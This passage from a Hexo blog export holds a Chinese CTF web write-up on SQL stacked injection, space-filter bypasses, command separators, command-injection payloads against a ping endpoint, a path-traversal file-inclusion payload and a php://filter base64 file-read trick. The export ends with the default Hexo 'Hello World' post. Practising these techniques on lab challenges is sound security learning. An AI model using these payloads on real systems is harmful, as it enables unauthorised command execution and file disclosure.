获取表中的第一行,FIRST(第一行)、NEXT(下一行)<br>当表名里有数字时要用反引号框起来<br></code></pre></td></tr></table></figure><p>可练习题目见</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">强网杯-随便注   <br></code></pre></td></tr></table></figure><h3 id="2-空格过滤方法"><a href="#2-空格过滤方法" class="headerlink" title="2.空格过滤方法"></a>2.空格过滤方法</h3><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mel">$IFS              <br>$IFS$6                               ——后面的数字<span class="hljs-number">6</span>换成其他数字也行<br>$&#123;IFS&#125; <br>&lt;<br>&lt;&gt;<br>&#123;cat,flag.php&#125;                      ——这里把，替换成了空格键<br>%20                                     ——代表space键<br>%09                                     ——代表Tab键<br></code></pre></td></tr></table></figure><h3 id="3-Windows和Linux通用命令分隔符"><a href="#3-Windows和Linux通用命令分隔符" class="headerlink" title="3.Windows和Linux通用命令分隔符"></a>3.Windows和Linux通用命令分隔符<ping ping ping></h3><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 1c">; : 命令<span class="hljs-number">1</span> ; 命令<span class="hljs-number">2</span>                  ——先执行命令<span class="hljs-number">1</span>再执行命令<span class="hljs-number">2</span><br><span class="hljs-meta">&amp; ：命令1 &amp; 命令2              ——先执行命令1再执行命令2</span><br><span class="hljs-string">| ： 命令1 &amp; 命令2               ——只执行命令2</span><br></code></pre></td></tr></table></figure><p>在知道命令分隔符的前提下,我们可以实现一种很神奇的绕过</p><p><img src="C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20231205174259364.png" alt="image-20231205174259364"></p><p>可以看见,我们使用分隔符|实现只执行第二个命令<ls> 即列出该目录下所有的文件</p><p>然后可见flag.php这个文件,答案就在眼前,但是当我们构造出查看该文件的命令时,却出现了这样一幕:</p><p><img src="C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20231205174542569.png" alt="image-20231205174542569"></p><p>很显然,我们的空格被过滤了＞﹏＜</p><p>用上刚学的空格过滤,我们发现还是打不开这个文件,于是退而求其次,看看另一个文件 里面是什么东西</p><p><img src="C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20231205174851323.png" alt="image-20231205174851323"></p><p>发现了源码,发现了一堆被过滤的东西ಥ_ಥ</p><p>这时候就有几种方式来进行绕过了</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-number">1</span>.拼接法绕过<br>  通过源码我们知道过滤了flag这四个字母,这个方法主要是绕过对flag正则匹配的检测，有点悬，目前好像只能拼接末尾的g\ag\lag，我也不太清楚为啥<br>  将lag替换成x，绕过对flag的正匹检测，构建payload<br>  inurl?ip=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>;x=lag;<span class="hljs-built_in">cat</span><span class="hljs-variable">$IFS</span><span class="hljs-variable">$6f</span><span class="hljs-variable">$x</span>.php&lt;ip中的<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>可以替换为任意数&gt;<br><span class="hljs-number">2</span>.内联执行法<br>可以看到代码没有过滤掉符号`  ， 所以可以利用内联执行的方式直接打开flag文件<br>先执行命令<span class="hljs-built_in">ls</span>，再把<span class="hljs-built_in">ls</span>得到的文件名全部用命令<span class="hljs-built_in">cat</span>打开，构建payload <br>inurl?ip=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>;<span class="hljs-built_in">cat</span><span class="hljs-variable">$IFS</span><span class="hljs-variable">$6</span>`ls`<br></code></pre></td></tr></table></figure><h3 id="4-文件包含类"><a href="#4-文件包含类" class="headerlink" title="4.文件包含类"></a>4.文件包含类<Warm up></h3><p>常规看源码或者检查网络可以看到一些小提示，比如某个奇怪的文件(●’◡’●)，这时候就可以尝试我们的文件包含</p><p><img src="C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20231205211154100.png" alt="image-20231205211154100"></p><p>就像这样，访问该文件，如果发现有<strong>include</strong>函数，实锤</p><h4 id="warm-up-wp："><a href="#warm-up-wp：" class="headerlink" title="warm up wp："></a><strong>warm up</strong> wp：</h4><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs gradle">可以看到<span class="hljs-keyword">include</span>函数没有任何过滤措施，那么我们可以利用本地文件包含漏洞来访问任意文件，以获取flag，但是想要执行<span class="hljs-keyword">include</span>函数，我们需要满足三个条件：<br><br><span class="hljs-number">1</span>. <span class="hljs-keyword">file</span>不为空<br><span class="hljs-number">2</span>. <span class="hljs-keyword">file</span>的值是字符串<br><span class="hljs-number">3</span>. <span class="hljs-keyword">file</span>通过emmm类的checkFile方法校验<br>步骤一：因为我们定义了<span class="hljs-keyword">file</span>的值且是string类型，所以第一个<span class="hljs-keyword">if</span> 的<span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span> 顺利绕过<br>步骤二：因为我们的<span class="hljs-keyword">file</span>的值既不是<span class="hljs-keyword">source</span>.php也不是hint.php，所以是无法通过该<span class="hljs-keyword">if</span>的，直接放弃这个<span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>的机会，继续往下看。<br>步骤三：mb_substr会将<span class="hljs-keyword">file</span>的值通过一定的规则截取后，再次放入<span class="hljs-keyword">if</span>判断，那么我们可以在<span class="hljs-keyword">file</span>的值前面主动拼接一个<span class="hljs-keyword">source</span>.php?或者hint.php?，也就是<span class="hljs-keyword">file</span>=<span class="hljs-keyword">source</span>.php?../ffffllllaaaagggg，通过mb_substr截取后的值是<span class="hljs-keyword">source</span>.php，此时checkFile返回<span class="hljs-keyword">true</span><br></code></pre></td></tr></table></figure><p>附上source.php源码截图</p><p><img src="C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20231205214739670.png" alt="image-20231205214739670"></p><h3 id="5-PHP伪协议"><a href="#5-PHP伪协议" class="headerlink" title="5.PHP伪协议"></a>5.PHP伪协议<Secret File></h3><h4 id="Secret-File-wp："><a href="#Secret-File-wp：" class="headerlink" title="Secret File wp："></a>Secret File wp：</h4><p>这道题开局有个小心机，有个按键被设置为和背景颜色一致，需要养成全选界面的好习惯，发现之后点击，会发现最后一个界面说的是没看清吗?,这时候就需要抓包(界面如下)来查看中间的一个文件是什么玩意,进入之后代码如下</p><p><img src="C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20231205215130127.png" alt="image-20231205215130127"></p><p><img src="C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20231205215253604.png" alt="image-20231205215253604"></p><p>访问该flag.php文件</p><p><img src="C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20231205215405300.png" alt="image-20231205215405300"></p><p>查看源码也发现不了任何的东西,因为php代码被执行之后是不会再显示出来的ヾ(•ω•&#96;)o</p><p>其实,在我们发现<strong>flag.php</strong>这个神奇文件的时候,第一反应应该是这是一道<strong>PHP伪协议</strong>题</p><p>下面是一种我掌握的<strong>PHP伪协议</strong>用法(有新的继续补充)</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">在后面加上<br><br>?<span class="hljs-built_in">file</span>=php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">read</span>=<span class="hljs-built_in">convert</span>.base64-encode/resource=flag.php即可。<br><br>这是因为 php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">read</span>=<span class="hljs-built_in">convert</span>.base64-encode 是一种 PHP 伪协议，用于将文件转换为 base64 格式。通过在 <span class="hljs-variable">$_GET</span> 超全局变量中传递 <span class="hljs-built_in">file</span>=php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">read</span>=<span class="hljs-built_in">convert</span>.base64-encode/resource=flag.php，我们可以读取 flag.php 文件的内容并将其转换为 base64 格式。然后，我们可以将该内容解码并查看其中是否包含有用的信息。<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2023/12/16/hello-world/"/>
    <url>/2023/12/16/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
